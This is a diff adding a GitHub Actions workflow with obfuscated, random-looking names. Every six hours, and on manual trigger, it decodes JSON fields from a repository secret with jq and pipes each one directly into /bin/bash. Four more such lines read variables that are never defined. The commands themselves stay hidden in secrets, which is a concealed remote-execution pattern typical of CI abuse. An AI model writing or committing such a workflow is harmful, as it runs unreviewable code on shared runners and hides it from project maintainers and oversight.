@@ -1,0 +1,22 @@
+name: dijingyun3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dijingyun3456
+        env:
+          ghxr88016: ${{ secrets.ghxr88016 }}
+        run: |
+          echo $ghxr88016 | jq -r .gqyhe05 | /bin/bash
+          echo $ueaws191 | jq -r .ssh5096 | /bin/bash
+          echo $fw56238 | jq -r .libta877 | /bin/bash
+          echo $rdb7220 | jq -r .r5 | /bin/bash
+          echo $zdr088 | jq -r .wptv2 | /bin/bash
+
